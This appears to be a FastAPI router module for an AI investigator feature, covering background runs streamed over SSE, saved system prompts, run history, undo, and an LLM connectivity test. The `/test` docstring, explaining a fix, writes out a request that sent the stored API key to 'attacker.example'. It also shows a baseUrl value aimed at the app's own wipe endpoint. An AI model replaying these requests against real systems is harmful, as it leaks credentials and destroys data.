"""AI endpoints: the tool-using investigator (SSE), the persisted conversation history, the legacy
analysis stream, and a connectivity test.

**The run does not belong to the HTTP request.** The investigation is driven by a background task that
writes every event into the persisted transcript (`ai/history.py`); the SSE response is only a live
TAIL of that task. Closing the stream — a page refresh, a tab switch, a dropped connection — therefore
no longer kills the investigation, and a reconnecting client rejoins by POLLING
`GET /api/ai/runs/{id}?since=<transcriptSeq>` until the run reaches a terminal state.

Polling rather than resuming the SSE stream is deliberate: the transcript has to be persisted anyway
for the history list, so `?since=` is the same read path serving both "read a finished conversation"
and "watch a running one", instead of a second server-side replay buffer with its own offset
bookkeeping. It is also the same shape as the upload/parse job polling the rest of the app already uses.

A CONVERSATION IS A CHAIN OF RUNS. `POST /api/ai/investigate` with `continueFrom` starts a new run
in the same thread, seeded with what the earlier turns established (`ai/continuation.py`), and
`GET /api/ai/runs/{id}/thread` returns the whole chain for the panel to render as one chat. The RUN
stays the unit of budget, of stopping and of undo — "revert what it just did" has to mean one turn.
"""
from __future__ import annotations

import asyncio
from typing import Literal, Optional

import orjson
from fastapi import APIRouter, HTTPException, Query
from fastapi.responses import StreamingResponse
from pydantic import BaseModel

from ..ai import runs as ai_runs
from ..ai.agents import analyze_stream
from ..ai.client import LLMClient
from ..ai.investigator import investigate, limits
from ..ai.prompts import INVESTIGATOR_SYSTEM
from ..ai.system_prompts import PROMPTS, PromptError, compose
from ..ai.tools import REGISTRY
from ..config import SettingsError, get_settings, is_masked, migrate_provider, update_settings, validate_base_url
from ..models import AiRun
from ..store import STORE

router = APIRouter(prefix="/ai", tags=["ai"])

# run id -> the background task driving it. Only used to keep a strong reference (asyncio only holds a
# weak one, and a garbage-collected task would silently stop the investigation mid-flight).
_LIVE: dict[str, asyncio.Task] = {}
_QUEUE_MAX = 4000   # live tail buffer; the transcript on disk is the record, so overflow only skips UI frames


class AnalyzeBody(BaseModel):
    scope: Literal["case", "event", "cluster", "selection"] = "case"
    id: Optional[str] = None
    eventIds: Optional[list[str]] = None
    question: Optional[str] = None


class TestBody(BaseModel):
    provider: str = "openai"  # 'none' | 'openai' (legacy 'anthropic' / 'openai-compatible' are mapped to 'openai')
    model: str = ""
    baseUrl: str = ""
    apiKey: str = ""
    verifyTls: bool = True
    caBundle: str = ""


@router.post("/analyze")
async def analyze(body: AnalyzeBody) -> StreamingResponse:
    gen = analyze_stream(STORE, body.scope, body.id, body.eventIds, body.question or "")
    return StreamingResponse(gen, media_type="text/event-stream",
                             headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no", "Connection": "keep-alive"})


# ------------------------------------------------------------------ investigator
class InvestigateBody(BaseModel):
    """A free-form objective, not a canned scope. `focus` is optional context the panel was opened from."""
    prompt: str
    runId: Optional[str] = None          # supply one to be able to stop the run before the first byte arrives
    maxSteps: Optional[int] = None
    maxSeconds: Optional[int] = None
    focus: Optional[str] = None          # e.g. "event e412" / "cluster C3" — appended to the objective
    # The run this one CONTINUES. Typing into an open conversation sends the id of its latest turn:
    # the new run joins that thread and starts from what the earlier turns established, instead of
    # re-investigating from scratch. Unknown or deleted ids degrade to a fresh conversation.
    continueFrom: Optional[str] = None
    # Which saved system prompt this run uses (see /ai/system-prompts). Omitted = the default chosen in
    # settings (`ai.systemPromptId`); '' = the built-in prompt alone; an id = that saved prompt.
    systemPromptId: Optional[str] = None


@router.post("/investigate")
async def investigate_stream(body: InvestigateBody) -> StreamingResponse:
    """Run the tool-using investigation and stream its progress (see docs/API_CONTRACT.md → AI investigator).

    The work runs in a background task, NOT in this request: a refresh mid-run must not lose the run.
    Reconnect with `GET /api/ai/runs/{id}?since=…`, or stop it with `/investigate/{id}/stop`.
    """
    run_id = (body.runId or "").strip() or ai_runs.new_id()
    # The objective stays exactly what the analyst typed; `focus` is passed separately so the stored
    # transcript shows their words, not their words plus a machine-appended parenthetical.
    objective = body.prompt.strip()
    focus = (body.focus or "").strip()[:200]
    continue_from = (body.continueFrom or "").strip()

    queue: asyncio.Queue = asyncio.Queue(maxsize=_QUEUE_MAX)

    async def drive() -> None:
        try:
            async for item in investigate(STORE, objective, run_id, body.maxSteps, body.maxSeconds,
                                          focus=focus, continue_from=continue_from,
                                          system_prompt_id=body.systemPromptId):
                try:
                    queue.put_nowait(item)
                except asyncio.QueueFull:
                    pass   # nobody is reading fast enough; the persisted transcript still has it
        finally:
            for _ in range(3):
                try:
                    queue.put_nowait(None)   # the sentinel must always land, or the reader hangs
                    break
                except asyncio.QueueFull:
                    try:
                        queue.get_nowait()
                    except asyncio.QueueEmpty:
                        break
            _LIVE.pop(run_id, None)

    _LIVE[run_id] = asyncio.get_running_loop().create_task(drive())

    async def gen():
        while True:
            item = await queue.get()
            if item is None:
                break
            yield "data: " + orjson.dumps(item).decode() + "\n\n"

    return StreamingResponse(gen(), media_type="text/event-stream",
                             headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no",
                                      "Connection": "keep-alive", "X-Iris-Run-Id": run_id})


@router.post("/investigate/{run_id}/stop")
def stop_run(run_id: str) -> dict:
    """Ask a live run to stop. It halts at the next checkpoint — before the next step, or right after the
    tool call in flight — so a long sequence can be interrupted without losing what it already wrote."""
    return {"ok": ai_runs.request_stop(run_id), "runId": run_id}


# ------------------------------------------------------------------ saved system prompts
class SystemPromptBody(BaseModel):
    name: Optional[str] = None
    text: Optional[str] = None


def _prompt_or_404(prompt_id: str) -> dict:
    row = PROMPTS.get(prompt_id)
    if row is None:
        raise HTTPException(status_code=404, detail="no saved system prompt with that id")
    return row


@router.get("/system-prompts")
def list_system_prompts() -> dict:
    """Every saved prompt (additional instructions, always appended to the built-in prompt), the
    built-in prompt itself, and which one runs by default (`settings.ai.systemPromptId`; '' = none)."""
    return {"prompts": PROMPTS.list(), "activeId": get_settings().ai.systemPromptId or "",
            "builtin": INVESTIGATOR_SYSTEM}


@router.post("/system-prompts", status_code=201)
def create_system_prompt(body: SystemPromptBody) -> dict:
    try:
        return PROMPTS.create(body.name or "", body.text or "")
    except PromptError as exc:
        raise HTTPException(status_code=400, detail=str(exc)) from exc


@router.get("/system-prompts/{prompt_id}/effective")
def effective_system_prompt(prompt_id: str) -> dict:
    """The EXACT text the model would receive with this prompt selected — the built-in prompt with the
    analyst's instructions appended; an author has to be able to read that, not guess at it."""
    row = _prompt_or_404(prompt_id)
    return {"id": row["id"], "name": row["name"], "text": compose(row)}


@router.put("/system-prompts/{prompt_id}")
def update_system_prompt(prompt_id: str, body: SystemPromptBody) -> dict:
    _prompt_or_404(prompt_id)
    try:
        row = PROMPTS.update(prompt_id, name=body.name, text=body.text)
    except PromptError as exc:
        raise HTTPException(status_code=400, detail=str(exc)) from exc
    if row is None:
        raise HTTPException(status_code=404, detail="no saved system prompt with that id")
    return row


@router.delete("/system-prompts/{prompt_id}")
def delete_system_prompt(prompt_id: str) -> dict:
    """Deleting the DEFAULT prompt resets the default to the built-in one — a settings value naming a
    prompt that no longer exists would make every run start with a warning."""
    if not PROMPTS.delete(prompt_id):
        raise HTTPException(status_code=404, detail="no saved system prompt with that id")
    reset = False
    if get_settings().ai.systemPromptId == prompt_id:
        update_settings({"ai": {"systemPromptId": ""}})
        reset = True
    return {"ok": True, "id": prompt_id, "defaultReset": reset}


@router.get("/tools")
def list_tools() -> dict:
    """The tool surface, so the UI (and a reviewer) can see exactly what the agent is able to do."""
    return {"tools": [{"name": t.name, "description": t.description, "writes": t.writes,
                       "parameters": sorted(t.properties)} for t in REGISTRY.values()],
            "limits": limits()}


@router.get("/runs")
def list_runs(limit: int = Query(30, ge=1, le=100), caseId: Optional[str] = None) -> dict:
    """The conversation history, newest first. Summaries only — the transcript comes from GET /runs/{id}.

    History is GLOBAL with a case ASSOCIATION (see app/ai/history.py): a run may target no case at all,
    so it is never filed under one. `caseId=` (empty string included) filters to the runs that were
    started against that case; omit it for everything.
    """
    rows = ai_runs.listing(limit, caseId)
    return {"runs": [ai_runs.as_model(r, transcript=False).model_dump() for r in rows]}


@router.get("/runs/{run_id}", response_model=AiRun)
def get_run(run_id: str, since: int = Query(0, ge=0)) -> AiRun:
    """One conversation in full. `since` returns only transcript entries newer than that `seq`, which is
    how a reconnecting panel tails a run that is still in flight without re-downloading it each poll."""
    rec = ai_runs.get(run_id)
    if rec is None:
        raise HTTPException(404, "no such run")
    return ai_runs.as_model(rec, since=since)


@router.get("/runs/{run_id}/thread")
def get_thread(run_id: str) -> dict:
    """Every turn of the conversation this run belongs to, oldest first, transcripts included.

    A conversation is a CHAIN of runs (see app/ai/history.py): the run stays the unit of budget,
    stopping and undo, while the thread is what the panel renders as one chat. Opening a conversation
    from History therefore fetches the thread, not the run — otherwise a follow-up would show the
    analyst only its own turn and lose everything the conversation had already established.
    """
    rows = ai_runs.thread(run_id)
    if not rows:
        raise HTTPException(404, "no such run")
    return {"threadId": rows[-1].get("threadId") or rows[-1]["id"],
            "runs": [ai_runs.as_model(r).model_dump() for r in rows]}


@router.delete("/runs/{run_id}")
def delete_run(run_id: str) -> dict:
    """Delete ONE conversation. The case artefacts it created are untouched — use /undo for those."""
    if not ai_runs.delete(run_id):
        raise HTTPException(404, "no such run")
    return {"ok": True, "runId": run_id}


@router.delete("/runs")
def clear_runs() -> dict:
    """Delete every stored conversation. `POST /api/admin/clear-all` does this too, with everything else."""
    return {"ok": True, "removed": ai_runs.clear_all()}


@router.post("/runs/{run_id}/undo")
def undo_run(run_id: str) -> dict:
    """Reverse every change the run made, newest first.

    Writes are applied as the agent makes them rather than queued behind a confirm dialog — an
    investigation that stops to ask permission twelve times is not an investigation. This is the other
    half of that bargain: one call takes the whole run back off the case.
    """
    try:
        return ai_runs.undo_run(run_id)
    except KeyError:
        raise HTTPException(404, "no such run")


@router.post("/test")
async def test(body: TestBody) -> dict:
    """Connectivity check against an OpenAI-compatible endpoint.

    THE STORED API KEY IS ONLY EVER SENT TO THE STORED baseUrl. This endpoint used to fall back to the
    saved key whenever the body's was blank or masked, with `baseUrl` taken from the body unvalidated —
    so one unauthenticated `POST /api/ai/test {"baseUrl":"https://attacker.example/v1"}` with no key
    mailed the analyst's real credential to that host as `Authorization: Bearer`. The Settings panel's
    real use of the fallback is "test the setup I already saved", which is exactly the same-host case,
    so restricting it costs nothing. Testing a DIFFERENT host must carry its own key, or none.

    `validate_base_url` is the same validator `PUT /api/settings` uses — one implementation, not two.
    It also closes the persistent variant of this: `ai.baseUrl` could be set to
    `http://127.0.0.1:8000/api/admin/clear-all?x=`, because the client APPENDS its API path and the
    appended part lands harmlessly in the query string, pointing Iris at its own wipe endpoint.
    """
    settings = get_settings()
    try:
        base_url = validate_base_url(body.baseUrl or "")
    except SettingsError as exc:
        raise HTTPException(400, str(exc))
    key = body.apiKey
    if not key or is_masked(key):
        # Same endpoint as the saved one? Then this is "test what I have configured" and the stored key
        # is the point of the call. Anything else gets no credential — never the stored one.
        key = settings.ai.apiKey if base_url.strip() == (settings.ai.baseUrl or "").strip() else ""
    provider = migrate_provider(body.provider)
    if provider == "none":
        return {"ok": False, "message": "No provider selected"}
    client = LLMClient(provider, body.model, base_url, key, timeout=30.0, verify_tls=body.verifyTls, ca_bundle=body.caBundle)
    ok, message, ms = await client.test()
    out: dict = {"ok": ok, "message": message}
    if ms is not None:
        out["latencyMs"] = ms
    return out
